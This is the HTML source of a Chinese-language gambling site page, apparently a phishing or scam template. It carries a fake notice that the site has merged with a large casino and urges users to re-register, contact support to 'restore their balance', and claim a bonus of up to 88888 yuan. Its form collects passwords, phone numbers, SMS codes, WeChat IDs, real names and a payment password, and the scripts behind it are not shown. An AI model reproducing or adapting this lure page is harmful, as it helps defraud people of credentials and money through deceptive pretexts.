<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1, user-scalable=no" name="viewport" />
  <title>金沙娱乐场</title>
  <link rel="stylesheet" href="./index.css">
</head>
<body>
  <div class="container">
    <div class="top">
      <img src="./img/logo.png" class="logo">
      <a href="https://vue.livelyhelp.chat/chatWindow.aspx?&j69=325963&ID=3563266&siteId=60000502&planId=e297305b-5ad5-4718-8865-6933f8a21993" target="_blank" class="kefu_a"><img src="./img/kefu.png" class="kefu"></a>
    </div>
    <div class="notice-area">
      <img src="./img/notice-tit.png" class="notice-tit">
      <div class="notice-text">
        尊敬的贵宾，您好!
        <p>
          为了给每一位玩家提供更好的游戏体验和资金安全本公司与世界500强金沙娱乐场合并！
        </p>
        所有本网站账号，将全部合并到<span class="color-yellow">金沙娱乐场官网</span>，您可以使用原有账号激活或<span class="color-orange">&nbsp;重新注册&nbsp;</span>，完成后均可享受金沙娱乐场用户优惠活动，激活账号或重新注册后请联系在线客服恢复余额以及<span class="color-yellow">新注册账号充值可领取神秘随机彩金最高</span><span class="color-orange">&nbsp;88888元</span>
      </div>
    </div>
    <div class="form">
      <img src="./img/form-tit.png" class="form-tit">
      <div class="from-list">
        <div class="from-item">
          <img src="./img/username-icon.png">
          <input type="text" placeholder="帐号（6-10位字母或数字）" id="username" maxlength="10" onblur="refreshArchCode()">
        </div>
        <div class="from-item">
          <img src="./img/password-icon.png">
          <input type="password" placeholder="密码（8-20位字母或数字）" id="password" maxlength="20">
        </div>
        <div class="from-item phone displayNo">
          <img src="./img/phone-icon.png" style="width: 0.24rem;">
          <input type="tel" placeholder="请输入手机号" id="phone" maxlength="11">
        </div>
        <div class="from-item sms displayNo">
          <img src="./img/sms-icon.png">
          <input type="tel" placeholder="请输入验证码" id="sms" maxlength="6">
          <div class="sms-btn">
            <span class="sms-span1">获取验证码</span>
            <span class="sms-span2">重新发送(<span id="time"></span>)</span>
          </div>
        </div>
        <div class="from-item email displayNo">
          <img src="./img/email-icon.png">
          <input type="text" placeholder="请输入邮箱地址" id="email" maxlength="30">
        </div>
        <div class="from-item wechat displayNo">
          <img src="./img/wechat-icon.png">
          <input type="text" placeholder="请输入微信号" id="wechat" maxlength="32">
        </div>
        <div class="from-item realName displayNo">
          <img src="./img/realName-icon.png">
          <input type="text" placeholder="请输入真实姓名" id="realName" maxlength="10">
        </div>
        <div class="from-item payPassword displayNo">
          <img src="./img/payPassword-icon.png">
          <input type="password" placeholder="支付密码6位数字" id="payPassword" maxlength="6">
        </div>
        <div class="from-item vercode displayNo">
          <input type="tel" placeholder="验证码" id="vercode" maxlength="4">
          <img class="auth-code-img" onclick="refreshArchCode()"/>
        </div>
      </div>
      <img src="./img/btn-bg.png" class="login-btn">
    </div>
    <div id="captcha"></div> 
    <div class="verify_all">
      <div class="margin_31">
        <div class="slide-verify" id="slideVerify" onselectstart="return false;">
          <div class="verify_title">拖动下方滑块完成拼图</div>
          <img
            style="position: relative; width: 6.2rem; height: 3.1rem;display: block;"
            class="slide-verify-img"
          />
          <div class="loading_verify"></div>
          <img
            style="width: 1.04rem;height: 3.1rem;"
            class="slide-verify-block"
          />
          <div
            class="slide-verify-slider container-active"
          >
            <div class="slide-verify-slider-mask">
              <div class="slide-verify-slider-mask-item" >
              </div>
            </div>
            <span class="slide-verify-slider-text"></span>
          </div>
          <div class="verify_toobar">
            <span class="close-btn"></span>
            <span class="reset-btn"></span>
          </div>
        </div>
      </div>
    </div>
  </div>
</body>
<script src="https://cstaticdun.126.net/load.min.js?t=201903281201"></script>
<script src="../js/jquery.js"></script>
<script src="../js/layer-v3.1.1/layer.js"></script>
<script src="./index.js"></script>
<script src="./verify.js"></script>
</html>
